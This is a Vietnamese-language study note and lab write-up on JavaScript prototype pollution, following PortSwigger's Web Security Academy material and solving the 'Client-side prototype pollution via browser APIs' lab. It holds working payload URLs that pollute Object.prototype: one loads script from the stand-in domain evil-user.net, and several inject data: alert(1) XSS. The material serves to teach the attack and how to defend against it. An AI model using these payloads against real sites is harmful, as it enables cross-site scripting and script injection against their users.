# Contents
- [What is prototype pollution?](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/Contents.md#what-is-prototype-pollution)
- [How do prototype pollution vulnerabilities arise?](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/Contents.md#how-do-prototype-pollution-vulnerabilities-arise)
- [Prototype pollution sources](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/Contents.md#prototype-pollution-sources)
- [Prototype pollution sinks](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/Contents.md#prototype-pollution-sinks)
- [Prototype pollution gadgets](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/Contents.md#prototype-pollution-gadgets)
- [Labs](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/Contents.md#labs)
    - [Lab: Client-side prototype pollution via browser APIs](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/Contents.md#lab-client-side-prototype-pollution-via-browser-apis)
# What is prototype pollution?
`Prototype pollution` là một `lỗ hổng JavaScript` cho phép kẻ tấn công `thêm các thuộc tính tùy ý` vào các nguyên mẫu đối tượng toàn cục (global object prototypes), sau đó các nguyên mẫu này có thể `được kế thừa` bởi các đối tượng do người dùng định nghĩa.

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/images/image0.png?raw=true)

Mặc dù `Prototype pollution` thường không thể khai thác độc lập như một lỗ hổng riêng lẻ, nhưng nó cho phép kẻ tấn công kiểm soát các thuộc tính của các đối tượng mà lẽ ra không thể truy cập được. Nếu ứng dụng sau đó xử lý một thuộc tính do kẻ tấn công kiểm soát một cách không an toàn, điều này có thể kết hợp với các lỗ hổng khác. Trong JavaScript phía client (client-side JavaScript), điều này thường dẫn đến `DOM XSS`, trong khi ô nhiễm prototype phía máy chủ (server-side prototype pollution) thậm chí có thể dẫn đến thực thi mã từ xa (remote code execution).
# How do prototype pollution vulnerabilities arise?
Các lỗ hổng `prototype pollution` thường phát sinh khi một hàm JavaScript hợp nhất đệ quy một đối tượng chứa các thuộc tính có thể kiểm soát bởi người dùng vào một đối tượng hiện có, mà không làm sạch các khóa trước. Điều này có thể cho phép kẻ tấn công chèn một thuộc tính với một khóa như `__proto__`, cùng với các thuộc tính lồng nhau tùy ý.

Do ý nghĩa đặc biệt của `__proto__` trong ngữ cảnh `JavaScript`, thao tác hợp nhất có thể gán các thuộc tính lồng nhau cho prototype của đối tượng thay vì chính đối tượng đích. Kết quả là, kẻ tấn công có thể "ô nhiễm" prototype với các thuộc tính chứa các giá trị độc hại, sau đó có thể được ứng dụng sử dụng theo cách nguy hiểm.

`Có thể làm ô nhiễm bất kỳ đối tượng prototype nào`, nhưng điều này phổ biến nhất xảy ra với `Object.prototype` toàn cục được tích hợp sẵn.

Việc khai thác thành công `prototype pollution` yêu cầu các thành phần chính sau:

- `Prototype pollution source`: Đây là bất kỳ đầu vào nào cho phép bạn "đầu độc" các đối tượng prototype bằng các thuộc tính tùy ý.
- `Điểm đích (sink)`: Nói cách khác, `một hàm JavaScript` hoặc `phần tử DOM` cho phép thực thi mã tùy ý.
- `Công cụ khai thác (exploitable gadget)`: Đây là bất kỳ thuộc tính nào được truyền vào điểm đích mà không có bộ lọc hoặc làm sạch thích hợp.
# Prototype pollution sources
`Prototype pollution sources` là bất kỳ đầu vào nào do người dùng kiểm soát cho phép bạn `thêm các thuộc tính tùy ý vào các đối tượng prototype`. Các nguồn phổ biến nhất là:
- URL thông qua chuỗi truy vấn (query string) hoặc chuỗi fragment (hash).
- Đầu vào dựa trên JSON.
- Tin nhắn web.

**1. Prototype pollution qua URL**

Hãy xem xét URL sau, chứa `một chuỗi truy vấn` được kẻ tấn công xây dựng:

    https://vulnerable-website.com/?__proto__[evilProperty]=payload

Khi chia chuỗi truy vấn thành các cặp `key:value`, một trình phân tích cú pháp URL có thể hiểu `__proto__` là một chuỗi tùy ý. Nhưng hãy xem điều gì sẽ xảy ra nếu các khóa và giá trị này sau đó `được hợp nhất` vào một đối tượng hiện có dưới dạng các thuộc tính.

Bạn có thể nghĩ rằng thuộc tính `__proto__`, cùng với thuộc tính lồng nhau `evilProperty`, sẽ chỉ được thêm vào đối tượng đích như sau:

    {
        existingProperty1: 'foo',
        existingProperty2: 'bar',
        __proto__: {
            evilProperty: 'payload'
        }
    }
Tuy nhiên, điều này không phải vậy. Tại một thời điểm nào đó, `thao tác hợp nhất đệ quy` có thể gán giá trị của `evilProperty` bằng một câu lệnh tương đương với sau đây:

    targetObject.__proto__.evilProperty = 'payload';

Trong quá trình gán này, công cụ JavaScript coi `__proto__` là một `getter` cho `prototype`. Kết quả là, `evilProperty` được gán cho đối tượng `prototype` được trả về thay vì chính đối tượng đích. Giả sử đối tượng đích sử dụng `Object.prototype` mặc định, tất cả các đối tượng trong thời gian chạy `JavaScript` sẽ kế thừa `evilProperty`, trừ khi chúng đã có một thuộc tính riêng với khóa trùng khớp.

Trong thực tế, việc chèn một thuộc tính có tên `evilProperty` khó có thể gây ra bất kỳ tác động nào. Tuy nhiên, kẻ tấn công có thể sử dụng cùng một kỹ thuật để làm `ô nhiễm prototype` với các thuộc tính được ứng dụng hoặc bất kỳ thư viện đã nhập nào sử dụng.

**2. Ô nhiễm Prototype qua đầu vào JSON**

Các đối tượng do người dùng kiểm soát thường được tạo ra từ một `chuỗi JSON` bằng phương thức `JSON.parse()`. Điều thú vị là `JSON.parse()` cũng coi bất kỳ khóa nào trong đối tượng JSON là một chuỗi tùy ý, bao gồm cả những thứ như `__proto__`. Điều này cung cấp một vector tiềm năng khác cho ô nhiễm prototype.

Giả sử kẻ tấn công `chèn JSON độc hại` sau, ví dụ, thông qua một tin nhắn web:

    {
        "__proto__": {
            "evilProperty": "payload"
        }
    }

Nếu điều này được chuyển đổi thành một `đối tượng JavaScript` thông qua phương thức `JSON.parse()`, đối tượng kết quả thực tế sẽ có một thuộc tính với khóa `__proto__`:

    const objectLiteral = {__proto__: {evilProperty: 'payload'}};
    const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

    objectLiteral.hasOwnProperty('__proto__');     // false
    objectFromJson.hasOwnProperty('__proto__');    // true

Nếu đối tượng được tạo thông qua `JSON.parse()` sau đó được hợp nhất vào một đối tượng hiện có mà không có quá trình làm sạch khóa thích hợp, điều này cũng sẽ dẫn đến `ô nhiễm prototype` trong quá trình gán, như chúng ta đã thấy trong ví dụ dựa trên URL trước đó.
# Prototype pollution sinks
Một `điểm đích ô nhiễm prototype` về cơ bản chỉ là `một hàm JavaScript` hoặc `một phần tử DOM` mà bạn có thể truy cập thông qua ô nhiễm prototype, cho phép bạn `thực thi các lệnh JavaScript hoặc lệnh hệ thống tùy ý`.

Vì ô nhiễm prototype cho phép bạn `kiểm soát các thuộc tính mà lẽ ra không thể truy cập được`, điều này có khả năng cho phép bạn tiếp cận một số điểm đích bổ sung trong ứng dụng mục tiêu. Các nhà phát triển không quen thuộc với ô nhiễm prototype có thể lầm tưởng rằng các thuộc tính này không thể được người dùng kiểm soát, điều này có nghĩa là có thể chỉ có bộ lọc hoặc quá trình làm sạch tối thiểu được áp dụng.
# Prototype pollution gadgets
Một `công cụ khai thác (gadget)` cung cấp phương tiện để biến lỗ hổng ô nhiễm prototype thành một cuộc tấn công thực sự. Đây là bất kỳ thuộc tính nào:
- Được `ứng dụng sử dụng một cách không an toàn`, chẳng hạn như `chuyển nó đến một điểm đích` (sink) mà không có bộ lọc hoặc làm sạch thích hợp.
- Có thể kiểm soát bởi kẻ tấn công thông qua ô nhiễm prototype. Nói cách khác, đối tượng phải `có khả năng kế thừa một phiên bản độc hại của thuộc tính được kẻ tấn công thêm vào prototype`.

Một thuộc tính `không thể là một công cụ khai thác nếu nó được định nghĩa trực tiếp trên chính đối tượng đó`. Trong trường hợp này, `phiên bản riêng của thuộc tính của đối tượng` sẽ được ưu tiên hơn bất kỳ phiên bản độc hại nào mà bạn có thể thêm vào prototype. Các trang web mạnh mẽ cũng có thể rõ ràng đặt prototype của đối tượng thành `null`, điều này đảm bảo rằng nó không kế thừa bất kỳ thuộc tính nào cả.

**Ví dụ về công cụ khai thác ô nhiễm Prototype**

Nhiều thư viện JavaScript `chấp nhận một đối tượng mà các nhà phát triển có thể sử dụng để đặt các tùy chọn cấu hình khác nhau`. Mã thư viện kiểm tra xem nhà phát triển có rõ ràng thêm các thuộc tính nhất định vào đối tượng này hay không và nếu có, điều chỉnh cấu hình tương ứng. Nếu một thuộc tính đại diện cho một tùy chọn cụ thể không có mặt, một tùy chọn mặc định được xác định trước thường được sử dụng thay thế. Một ví dụ đơn giản có thể trông như thế này:

    let transport_url = config.transport_url || defaults.transport_url;

Bây giờ hãy tưởng tượng mã thư viện sử dụng `transport_url` này để thêm một tham chiếu script vào trang:

    let script = document.createElement('script');
    script.src = `${transport_url}/example.js`;
    document.body.appendChild(script);
Nếu các nhà phát triển của trang web chưa đặt thuộc tính `transport_url` trên đối tượng config của họ, đây là một công cụ khai thác tiềm năng. Trong trường hợp kẻ tấn công có thể làm ô nhiễm `Object.prototype` toàn cục với thuộc tính `transport_url của riêng chúng`, thuộc tính này sẽ được đối tượng config kế thừa và do đó, được đặt làm src cho script này đến một miền do kẻ tấn công chọn.

Nếu prototype có thể bị ô nhiễm thông qua một `tham số truy vấn`, ví dụ, kẻ tấn công sẽ chỉ cần dụ nạn nhân truy cập một URL được tạo đặc biệt để khiến trình duyệt của họ `nhập một tệp JavaScript độc hại từ một miền do kẻ tấn công kiểm soát`:

    https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net

Bằng cách cung cấp một URL `data:`, kẻ tấn công cũng có thể trực tiếp `nhúng một payload XSS` vào chuỗi truy vấn như sau:

    https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//

Lưu ý rằng dấu `//` ở cuối trong ví dụ này chỉ đơn giản là `để bỏ qua hậu tố /example.js` được mã hóa cứng.

# Labs
## Lab: Client-side prototype pollution via browser APIs
**1. Yêu cầu**

Bài lab này dễ bị tấn công DOM XSS thông qua ô nhiễm prototype phía client. Các nhà phát triển của trang web đã nhận thấy một công cụ khai thác tiềm năng và đã cố gắng vá lỗi. Tuy nhiên, bạn có thể vượt qua các biện pháp họ đã thực hiện.

Để giải quyết bài lab này, bạn cần thực hiện các bước sau:
- Tìm một nguồn mà bạn có thể sử dụng để `thêm các thuộc tính tùy ý vào Object.prototype toàn cục`.
- Xác định `một thuộc tính công cụ khai thác` cho phép bạn thực thi JavaScript tùy ý.
- Kết hợp chúng để gọi hàm `alert()`.

**2. Thực hiện**

Trước tiên, tôi sẽ `tìm điểm` có thể gây prototype pollution.

Truy cập lab:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/images/image1.png?raw=true)

Thử sửa URL thành:

    https://0a3500e903405d928061220d001600c0.web-security-academy.net/?__proto__[foo]=bar

Kiểm tra qua dev tools:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/images/image2.png?raw=true)

=> Có thuộc tính foo: "bar" xuất hiện ⇒ Xác nhận được có prototype pollution qua query string.

Tiếp theo, tôi sẽ `xác định gadget` có thể khai thác.

Tìm kiếm trong tab Sources, tôi tìm được file `searchLoggerConfigurable.js`:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/images/image3.png?raw=true)

Chú ý đoạn code:

    if (config.transport_url) {
        const script = document.createElement('script');
        script.src = config.transport_url;
        document.head.appendChild(script);
    }

- Biến `config` có thể lấy từ `Object.prototype`, tức là bị ảnh hưởng bởi prototype pollution.

Dòng:

    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});

=> Cho biết chỉ định nghĩa `writable` và `configurable` mà `không có value`, vì vậy `nếu value đã có từ prototype`, nó sẽ `bị khóa và giữ nguyên` => ta có thể `inject giá trị trước khi defineProperty bị gọi`.

Tiêp theo, tôi sẽ thử khai thác, thay đổi URL thành:

    https://0a3500e903405d928061220d001600c0.web-security-academy.net/?__proto__[value]=foo

Kiểm tra:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/images/image4.png?raw=true)

=> Đã thành công chèn `<script>`.

Tiếp theo, thử thay URL bằng cách chèn payload XSS:

    https://0a3500e903405d928061220d001600c0.web-security-academy.net/?__proto__[value]=data:,alert(1);

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/images/image5.png?raw=true)

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Prototype_pollution/images/image6.png?raw=true)










